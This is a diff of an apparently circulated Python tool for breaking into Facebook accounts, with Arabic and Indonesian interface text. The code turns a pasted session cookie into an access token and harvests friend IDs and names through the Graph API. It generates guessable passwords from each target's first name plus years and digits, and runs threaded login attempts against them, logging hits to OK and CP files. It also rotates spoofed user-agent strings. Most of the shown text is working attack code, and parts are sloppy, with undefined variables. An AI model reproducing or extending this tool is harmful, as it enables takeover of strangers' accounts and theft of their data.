 	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	h=random.randrange(1, 9)
-	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
-	j=random.randrange(1, 9)
-	k=random.randrange(1, 9)
-	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
-	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
-
-		
-#------------[ R ]---------------#
+	g='AppleWebKit/413 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+	aa='NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 12;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['SAMSUNG SM-X906B)'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Chrome/100.0.4896.88 Safari/537.36 UNTRUSTED/1.0'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+	aa='NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['nokiac1-01)'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='U2/1.0.0 UCBrowser/8.9.0.251'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='U2/1.0.0 Mobile UNTRUSTED/1.06'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
 cokbrut=[]
 pwpluss,pwnya=[],[]
-#------------[ Herko]--------------#
+#------------[ 𝙼𝙸𝙼𝙾 ]--------------#
 P = '\x1b[1;97m'
 M = '\x1b[1;91m'
 H = '\x1b[1;92m'
@@ -424,8 +227,70 @@ u = '\033[95m' # UNGU
 kk = '\033[33m' # KUNING -
 b = '\33[1;96m' # BIRU -
 p = '\x1b[0;34m' # BIRU +
-asu = random.choice([m,k,h,u,b])
-#--------------------[ seo ]--------------#
+xxh = '\x1b[38;5;208m'#برتقالي
+r1='\x1b[38;5;8m'#رمادي
+m1='\x1b[38;5;196m'#احمر
+a1 = '\x1b[1;31m'  # أحمر
+a2 = '\x1b[1;34m'  # أزرق
+a3 = '\x1b[1;32m'  # أخضر
+a4 = '\x1b[1;33m'  # أصفر
+a5 = '\x1b[38;5;208m'  # برتقالي
+a6 = '\x1b[38;5;5m'  # أرجواني
+a7 = '\x1b[38;5;13m'  # وردي
+a8 = '\x1b[1;30m'  # أسود
+a9 = '\x1b[1;37m'  # أبيض
+a10 = '\x1b[38;5;52m'  # بني
+a11 = '\x1b[38;5;8m'  # رمادي
+a12 = '\x1b[38;5;220m'  # ذهبي
+a13 = '\x1b[38;5;7m'  # فضي
+a14 = '\x1b[38;5;153m'  # أزرق فاتح
+a15 = '\x1b[38;5;18m'  # أزرق داكن
+a16 = '\x1b[38;5;48m'  # أخضر فاتح
+a17 = '\x1b[38;5;22m'  # أخضر داكن
+a18 = '\x1b[38;5;196m'  # أحمر فاتح
+a19 = '\x1b[38;5;88m'  # أحمر داكن
+a20 = '\x1b[38;5;226m'  # أصفر فاتح
+a21 = '\x1b[38;5;136m'  # أصفر داكن
+a22 = '\x1b[38;5;216m'  # برتقالي فاتح
+a23 = '\x1b[38;5;166m'  # برتقالي داكن
+a24 = '\x1b[38;5;234m'  # أرجواني فاتح
+a25 = '\x1b[38;5;91m'  # أرجواني داكن
+a26 = '\x1b[38;5;205m'  # وردي فاتح
+a27 = '\x1b[38;5;161m'  # وردي داكن
+a28 = '\x1b[38;5;236m'  # أسود فاتح
+a29 = '\x1b[38;5;233m'  # أسود داكن
+a30 = '\x1b[38;5;255m'  # أبيض فاتح
+a31 = '\x1b[38;5;231m'  # أبيض داكن
+a32 = '\x1b[38;5;180m'  # بني فاتح
+a33 = '\x1b[38;5;94m'  # بني داكن
+a34 = '\x1b[38;5;252m'  # رمادي فاتح
+a35 = '\x1b[38;5;246m'  # رمادي داكن
+a36 = '\x1b[38;5;228m'  # ذهبي فاتح
+a37 = '\x1b[38;5;172m'  # ذهبي داكن
+a38 = '\x1b[38;5;188m'  # فضي فاتح
+a39 = '\x1b[38;5;247m'  # فضي داكن
+a40 = '\x1b[38;5;117m'  # أزرق سماوي
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+h = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+asu = random.choice([a3,a4,a5,a6,a7,a10,a12,a14,u,k,kk,b,h,hh,a19,a20,a21,a37,a40,xxh,])
+#--------------------[ 𝙼𝙸𝙼𝙾]--------------#
 dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
 dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
 tgl = datetime.datetime.now().day
@@ -433,8 +298,9 @@ bln = dic[(str(datetime.datetime.now().month))]
 thn = datetime.datetime.now().year
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
-import requests
-import webbrowser
+#------------------[ 𝙼𝙸𝙼𝙾]---------------#
+
+
 import os
 try:
     import requests
@@ -459,59 +325,55 @@ O = '\x1b[1;96m' # BIRU MUDA
 N = '\x1b[0m'    # WARNA MATI
 H = '\x1b[1;92m' # HIJAU
 K = '\x1b[1;93m' # KUNING
-
-
-def xox(z):
-	for e in z + '\n':
-		sys.stdout.write(e)
-		sys.stdout.flush()
-		time.sleep(0.01)
+P = '\x1b[1;97m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+Z = "\033[1;30m"
 
 
 def banner():
-	print("%s╔══════════════════════════════════════════╗"%(Z))
-	print("")
-	print(F"""{asu}
-	
-	  
-{P}┏{B}━━━━━━━━━━━━━━━━━━━━━━━━━━{P}┓    
-{B}┃{C} ⌯ Telegram {B}› {C}  @I_X_E0 {B} 	┃
-{P}┗{B}━━━━━━━━━━━━━━━━━━━━━━━━━━{P}┛              
-""")
-	
+	print(f'''''')
 
-				
-def SDM():
-	try:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-		tokenku.append(token)
-		try:
-			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
-			sy2 = json.loads(sy.text)['name']
-			sy3 = json.loads(sy.text)['id']
-			menu(sy2,sy3)
-		except KeyError:
-			login_lagi334()
-		except requests.exceptions.ConnectionError:
-			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
-			lo = mark(li, style='red')
-			sol().print(lo, style='cyan')
-			exit()
-	except IOError:
-		login_lagi334()
+def Login():
+    try:
+        token = open('.token.txt','r').read()
+        cok = open('.cok.txt','r').read()
+        tokenku.append(token)
+        try:
+            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie_by_dyno':cok})
+            sy2 = json.loads(sy.text)['name']
+            sy3 = json.loads(sy.text)['id']
+            menu()
+        except KeyError:
+            login_HANI()
+        except requests.exceptions.ConnectionError:
+            dynox1 = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
+            dynox2 = mark(Loginx1, style='red')
+            sol().print(dynox2, style='cyan')
+            exit()
+    except IOError:
+        login_HANI()
 
-
-def login_lagi334():
-	try:
-		
-		asu = random.choice([m,k,h,b,u])
-		os.system('clear')
-		cookie=input(f'  [{h}•{x}]Koki :{asu} ')
-		open(".cok.txt", "w").write(cookie)
-		with requests.Session() as rsn:
-			try:
-				rsn.headers.update({
+def login_HANI():
+    
+    try:
+        asu = random.choice([
+            m,
+            k,
+            h,
+            b,
+            u])
+        os.system('clear')
+        banner()
+        print('')
+        print('')
+        cookie = input(f'''[{H}={X}]  Cookies :{asu} ''')
+        open('.cok.txt', 'w').write(cookie)
+        with requests.Session() as rsn:
+            
+            try:
+                rsn.headers.update({
                     'Accept-Language': 'id,en;q=0.9',
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
                     'Referer': 'https://www.instagram.com/',
@@ -522,35 +384,42 @@ def login_lagi334():
                     'Sec-Fetch-Site': 'cross-site',
                     'Sec-Fetch-Dest': 'empty',
                     'Origin': 'https://www.instagram.com',
-                    'Accept-Encoding': 'gzip, deflate',
-                })
-				response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie':cookie})
-				if '"access_token":' in str(response.headers):
-					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
-					open(".token.txt", "w").write(token)
-					print('%sLogin Succes%s'%(h, p))
+                    'Accept-Encoding': 'gzip, deflate' })
+                response = rsn.get('https://www.facebook.com/x/oauth/status?client_id=124024574287414&wants_cookie_data=true&origin=1&input_token=&sdk=joey&redirect_uri=https://www.instagram.com/brutalid_/', cookies={'cookie': cookie_by_dyno })
+                if '"access_token":' in str(response.headers):
+                    open('.token.txt', 'w').write(token)
+                    print('')
+                    print('')
+                    print(f'''{x}[{h}√{x}]{h} Successful login.{x} ''')
+                    time.sleep(1)
+                else:
+                    print('')
+                    print('')
+                    print('%sكوكيز غير صالح ✖%s' % (m, p))
+            except Exception as ee:
+                print('')
+                print('')
+                print('كوكيز غير صالح ✖ ')
 
-				else:
-					print('%sFailled Get Token%s'%(m, p))
+    except Exception as e:
+        try:
+            os.system('rm -f .token.txt')
+            os.system('rm -f .cok.txt')
+            print('')
+            print('')
+            print(f'''{x}[{h}√{x}]{h} Successful login.{x} ''')
+            time.sleep(1)
+            print(e)
+            exit()
+        except Exception as e:
+        	pass
 
-			except:
-				print('Failled Get Token')
+L = "\x1b[1;32m"  #ارجواني
+# 
 
-		print(f'  {x}[{h}•{x}]{h} Berhasil Jalankan Lagi Perintahnya!!!!{x} ');time.sleep(1)
-		exit()
-	except Exception as e:
-		os.system("rm -f .token.txt")
-		os.system("rm -f .cok.txt")
-		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LUU NGAB !!%s'%(x,k,x,m,x))
-		print(e)
-		exit()
-def bot():
-	try:
-		requests.post("https://graph.facebook.com/100002045441878?fields=subscribers&access_token=%s"%(tokenku))
-	except:
-		pass
-def menu(my_name,my_id):	
+def menu():
 	ip = requests.get("https://api.ipify.org").text
+	
 	os.system('clear')
 	banner()
 	print('''[107;40m[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;215m%[38;5;215m%[38;5;221m%[38;5;221m%[38;5;215m%[38;5;215m%[38;5;221m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;221m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;215m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%[38;5;221m%
@@ -615,13 +484,12 @@ def menu(my_name,my_id):
 [38;5;009m*[38;5;009m*[38;5;009m*[38;5;009m*[38;5;009m*[38;5;009m*[38;5;009m*[38;5;196m*[38;5;160m*[38;5;009m*[38;5;160m*[38;5;160m*[38;5;160m*[38;5;009m*[38;5;160m*[38;5;124m*[38;5;196m*[38;5;196m*[38;5;160m*[38;5;160m*[38;5;196m*[38;5;137m([38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;216m%[38;5;180m#[38;5;217m%[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;217m%[38;5;223m&[38;5;223m&[38;5;223m&[38;5;137m([38;5;124m*[38;5;009m*[38;5;124m*[38;5;160m*[38;5;196m*[38;5;088m,[38;5;196m*[38;5;196m*[38;5;009m*[38;5;160m*[38;5;160m*[38;5;196m*[38;5;160m*[38;5;196m*[38;5;009m*[38;5;009m*[38;5;009m*
 [38;5;009m*[38;5;009m*[38;5;009m*[38;5;009m*[38;5;009m*[38;5;009m*[38;5;009m*[38;5;009m*[38;5;196m*[38;5;009m*[38;5;009m*[38;5;160m*[38;5;196m*[38;5;009m*[38;5;009m*[38;5;088m,[38;5;196m*[38;5;196m*[38;5;196m*[38;5;160m*[38;5;160m*[38;5;160m*[38;5;223m%[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;222m%[38;5;180m#[38;5;223m%[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m&[38;5;223m%[38;5;223m%[38;5;223m%[38;5;125m*[38;5;160m*[38;5;160m*[38;5;196m*[38;5;124m*[38;5;160m*[38;5;009m*[38;5;160m*[38;5;160m*[38;5;009m*[38;5;160m*[38;5;196m*[38;5;009m*[38;5;009m*[38;5;009m*[38;5;009m*[38;5;009m*[38;5;009m*
 [0m''')
-
+	print(output)
 	print(('\x1b[38;5;225m▬'*100)+'\n\n'+('\x1b[1;31m▬'*100))
 	print('\n')
 	
 	print('\n   \033[0m\033[1;93m [\033[1;93m\033[1;44m  𝗜𝗢𝗚i𝗡 i𝗡𝗙𝗢  :  معلومات المستخدم\033[0m\033[1;93m]\n')
-	print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m 𝐘𝐎𝗨𝐑 𝐈𝐃 ⚡️ : "+str(my_id)) 
-	print("\x1b[1;92m[\x1b[0m✔\x1b[1;92m] \x1b[0m 𝐍𝐀𝐌𝐄 ℡    : "+str(my_name))
+
 	try:
 		gep = requests.get('http://ipinfo.io/json').json()
 		print("%s[%s✔%s]%s  𝗖i𝗧𝗬   :%s %s"%(H,P,H,P,K,gep['region']))
@@ -630,6 +498,7 @@ def menu(my_name,my_id):
 	except:
 		print("%s[%s✔%s]%s 𝗖i𝗧𝗬 :%s -"%(H,P,H,P,K))
 		print("%s[%s✔%s]%s IP :%s -"%(H,P,H,P,K))
+
 	print('\033[2;35m')
 	g67 = '\x1b[38;5;161m'
 	print(g67+'▬'*67)
@@ -637,18 +506,21 @@ def menu(my_name,my_id):
 	print('  \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m}\x1b[38;5;133m 𝑇𝐸l𝐸 \x1b[38;5;230m ⁞ \x1b[38;5;153m@mx1mq')
 	print('\x1b[38;5;230m')
 	print('  \x1b[38;5;117m{\x1b[1;32m•\x1b[38;5;117m} \x1b[38;5;133m𝐂𝐇𝐀𝐍𝐍𝐄l \x1b[38;5;230m ⁞ \x1b[38;5;153m @MIMO X VIP  ')
-
 	print('')
 	print(g67+'━'*67)
-	print(' {\x1b[1;32m1\x1b[1;36m} \x1b[38;5;208m𝐅𝐑𝐈𝐄𝐍𝐃𝐒     :  من الاصدقاء      ')
+	print('  {\x1b[1;32m1\x1b[1;36m} \x1b[38;5;208m𝐅𝐑𝐈𝐄𝐍𝐃𝐒     :  من الاصدقاء     ')
 	print(g67+'━'*67)
-	print('{\x1b[1;32m2\x1b[1;36m} \x1b[38;5;208m𝐅𝐑𝐎𝐌 𝐅𝐈l𝐄  :     من ملف    ')	
-	print(a22+'––'*25)
-	print(' {\x1b[1;32m0\x1b[1;36m} \x1b[38;5;196m𝐄𝐗𝐈𝐓       :   تسجيل خروج    ')
+	print('  {\x1b[1;32m2\x1b[1;36m} \x1b[38;5;208m𝐅𝐑𝐎𝐌 𝐅𝐈l𝐄  :     من ملف    ')
+	
 	print(g67+'━'*67)
+	print('  {\x1b[1;32m0\x1b[1;36m} \x1b[38;5;196m𝐄𝐗𝐈𝐓       :   تسجيل خروج    ')
+	print(g67+'━'*67)
+		
 	_____alvino__adijaya_____ = input('\n[=] \x1b[1;32m 𝗖𝗛𝗢𝗦𝗘 ๛ : ')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
+	elif _____alvino__adijaya_____ in ['3']:
+		follower()	
 	elif _____alvino__adijaya_____ in ['2']:
 		TakeFile()	
 	elif _____alvino__adijaya_____ in ['0']:
@@ -662,7 +534,7 @@ def follower():
 	except IOError:
 		exit()
 	try:
-		jum = int(input('\x1b[1;31m[>>] 𝐈𝐃 LIMIT : اكتب عدد الايديات '))
+		jum = int(input('\x1b[1;31m[>>] 𝐈𝐃 D LIMIT : اكتب عدد الايديات '))
 	except ValueError:
 		print('{k}[✖] NOT PUBLIC ID ')
 		time.sleep(3)
@@ -715,49 +587,29 @@ def TakeFile():
 			follower()
 
 def dump_massal():
-	with requests.Session() as ses:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
-		a = input(f' {u}ID : ')
-		
-		try:
-			params = {
-			"access_token": token, 
-			"fields": "name,friends.fields(id,name,birthday)"
-			}
-			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
-			for c in b["friends"]["data"]:
-				id.append(c["id"]+"|"+c["name"])
-			
-			yu = f'{b} Total ID :  \033[2;32m '+str(len(id))
-			print(yu)
-			setting()
-		except Exception as e:
-			print(e)
-def dump_massal():
-	with requests.Session() as ses:
-		token = open('.token.txt','r').read()
-		cok = open('.cok.txt','r').read()
 	try:
-		print('')
-		kumpulkan = int(input(f'    \x1b[38;5;225m>> MANY  𝐈𝐃  :'))
-		print('')
-		
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		jum = int(input('\x1b[38;5;225m>> MANY  𝐈𝐃  : '))
 	except ValueError:
-	    exit()
-	if kumpulkan<1 or kumpulkan>1000:
-	    exit()
+		print('>> Masukkan Angka Anjing, Malah Huruff ')
+		exit()
+	if jum<1 or jum>100:
+		print('>> Gagal Dump Idz ')
+		exit()
 	ses=requests.Session()
-	bilangan = 0
-	for KOTG49H in range(kumpulkan):
-		bilangan+=1
-		Masukan = input(f'\x1b[38;5;161m>>  𝐈𝐃  '+str(bilangan)+f' : ')
-		#print(f'')
-		uid.append(Masukan)
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input('\x1b[38;5;161m>>  𝐈𝐃  '+str(yz)+' : ')
+		uid.append(kl)
 	for user in uid:
 	    try:
 	       head = (
-	       {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36','Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','Mozilla/5.0 (Linux; Android 9; SH-03J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 13; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
+	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
 	       })
 	       if len(id) == 0:
 	           params = (
@@ -785,24 +637,25 @@ def dump_massal():
 	    except requests.exceptions.ConnectionError:
 	        exit()
 	try:
-	      op = f"\x1b[38;5;8m,»  𝐈𝐃  | عدد الايديات{H} : "+str(len(id))
-	      print('')
-	      print(op)
-	      setting() 
-	except Exception as e:
-	    print(e) 
-	    exit()
+		print('')
+		print(f'\x1b[38;5;8m,»  𝐈𝐃  | عدد الايديات {h}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'{x}')
+		print('>> Sinyal Loh Kurang Bagus ')
+		back()
+	except (KeyError,IOError):
+		print(f'>>{k} Pertemanan Tidak Public {x}')
+		time.sleep(3)
+		back()
 
 def setting():
-	wl = f''
-
-	sol().print(mark(wl, style='yellow'))
-	teks = (f'{H}.....') 
-	print('') 
-	print(teks)
-	hu =('3') 
-		  
-	if hu in ['1','01']:
+	print(f'\033[1;34m══════════════════════════════════════════════════════════')
+	print(' \033[1;95m [ 1 ] ➙ MIX -  𝐈𝐃  ')
+	
+	print('')
+	hu = input('\x1b[1;32m» └──🄲🄷🄾🄾🅂🄴 : ')
+	if hu in ['3','03']:
 		for tua in sorted(id):
 			id2.append(tua)
 
@@ -815,36 +668,49 @@ def setting():
 		for xmud in range(bcm):
 			id2.append(muda[bcmi])
 			bcmi -=1
-	elif hu in ['3','03']:
+	elif hu in ['1','01']:
 		for bacot in id:
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		ric = ''
-		sol().print(mark(ric, style='green'))
+		print('>> PILIH YANG BENAR BANG ')
 		exit()
-	hc =('1') 
-	print('▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬') 
+	print(f'\033[1;34m══════════════════════════════════════════════════════════')
+	print(L+ '\033[1;95m [ 1 ] ➙ SHOW CP ')
+#	print('>> 2. Mbasic ')
+#	print('>> 3. Touch  ')
+#	print('>> 4. Mtouch ')
+	print('')
+	hc = input('\x1b[1;32m » └──🄲🄷🄾🄾🅂🄴 : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
-		print('[VIP]  PILIH YANG BENAR BANG ')
+		print('>> PILIH YANG BENAR BANG ')
 		setting()
+	elif hc in ['2','02']:
+		method.append('free')
+	elif hc in ['3','03']:
+		method.append('touch')
 	elif hc in ['4','04']:
 		method.append('mbasic')
 	else:
 		method.append('mobile')
+	print(f'\033[1;34m══════════════════════════════════════════════════════════')
+	
+	print('\033[1;95m [ 1 ] ➙ Show cookies - اظهار الكوكيز')
 	print('')
-	_jembot_ =('Y') 
+	_jembot_ = input('\x1b[1;32m➙ └──🄲🄷🄾🄾🅂🄴 :')
 	if _jembot_ in ['']:
 		print('>> Pilih Yang Bener Kontol ')
 		back()
-	elif _jembot_ in ['y','Y']:
+	elif _jembot_ in ['1','1']:
 		taplikasi.append('ya')
 	else:
 		taplikasi.append('no')
-	pwplus= 't'
-	if pwplus in ['y','Y']:
+	print(f'\033[1;34m══════════════════════════════════════════════════════════')
+	print('\x1b[95m [ 1 ] ➙ Password - باسورد عشوائي')
+	pwplus=input('\x1b[1;32m➙└──🄲🄷🄾🄾🅂🄴 :')
+	if pwplus in ['2','2']:
 		pwpluss.append('ya')
 		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
 		pwku=input('>> Masukkan Password Tambahan : ')
@@ -853,129 +719,156 @@ def setting():
 			pwnya.append(xpw)
 	else:
 		pwpluss.append('no')
-	passwrd()
-
+	passwrd() 
 def passwrd():
-    with tred(max_workers=30) as pool:
-        for yuzong in id2:
-            idf = yuzong.split('|')[0]
-            nmf = yuzong.split('|')[1].lower()
-            frs = nmf.split(' ')[0]
-            pwv = []
-            if len(nmf) < 6:
-                if len(frs) < 3:
-                    pass
-                else:
-                    pwv.append(nmf)
-                    pwv.append(frs + frs)
-                    pwv.append(frs +' '+frs)
-                    pwv.append('first last')
-                    pwv.append('firstlast')
-                    pwv.append(frs + '1234')
-                    pwv.append('123'+frs)
-                    pwv.append('1234'+frs)
-                    pwv.append(frs + '123456')
-                    pwv.append(frs + '12')
-                    pwv.append(frs + '123')
-                    pwv.append(frs + '2021')
-                    pwv.append(frs + '2022')
-                    pwv.append(frs + '2020')
-                    pwv.append(frs + '2005')
-                    pwv.append(frs + '2004')
-                    pwv.append(frs + '2003')
-                    pwv.append(frs + '2002')
-                    pwv.append(frs + '2001')
-                    pwv.append(frs + '2000')
-                    pwv.append(frs + '2006')
-                    pwv.append(frs + '2007')
-                    pwv.append(frs + '1999')
-                    pwv.append(frs + '1995')
-                    pwv.append(frs + '1998')
-                    pwv.append(frs + '1997')
-                    pwv.append(frs + '1212')
-                    pwv.append(frs + '2007@')
-                    pwv.append(frs + '2006@')
-                    pwv.append(frs + '2005@')
-                    pwv.append(frs + '2004@')
-                    pwv.append(frs + '2003@')
-                    pwv.append(frs + '2002@')
-                    pwv.append(frs + '2001@')
-                    pwv.append(frs + '2000@')
-            elif len(frs) < 3:
-                pwv.append(nmf)
-            else:
-                    pwv.append(nmf)
-                    pwv.append(frs + frs)
-                    pwv.append(frs +' '+frs)
-                    pwv.append('first last')
-                    pwv.append('firstlast')
-                    pwv.append(frs + '1234')
-                    pwv.append('123'+frs)
-                    pwv.append('1234'+frs)
-                    pwv.append(frs + '123456')
-                    pwv.append(frs + '12')
-                    pwv.append(frs + '123')
-                    pwv.append(frs + '2021')
-                    pwv.append(frs + '2022')
-                    pwv.append(frs + '2020')
-                    pwv.append(frs + '2005')
-                    pwv.append(frs + '2004')
-                    pwv.append(frs + '2003')
-                    pwv.append(frs + '2002')
-                    pwv.append(frs + '2001')
-                    pwv.append(frs + '2000')
-                    pwv.append(frs + '2006')
-                    pwv.append(frs + '2007')
-                    pwv.append(frs + '1999')
-                    pwv.append(frs + '1995')
-                    pwv.append(frs + '1998')
-                    pwv.append(frs + '1997')
-                    pwv.append(frs + '1212')
-                    pwv.append(frs + '2007@')
-                    pwv.append(frs + '2006@')
-                    pwv.append(frs + '2005@')
-                    pwv.append(frs + '2004@')
-                    pwv.append(frs + '2003@')
-                    pwv.append(frs + '2002@')
-                    pwv.append(frs + '2001@')
-                    pwv.append(frs + '2000@')
-                
-            if 'ya' in pwpluss:
-                for xpwd in pwnya:
-                    pwv.append(xpwd)
-            if 'mobile' in method:
-                pool.submit(crack, idf, pwv)
-            elif 'free' in method:
-                pool.submit(crackfree, idf, pwv)
-            elif 'touch' in method:
-                pool.submit(cracktouch, idf, pwv)
-            elif 'mbasic' in method:
-                pool.submit(crackmbasic, idf, pwv)
-            else:
-               pool.submit(crackmbasic, idf, pwv)
+	
+	
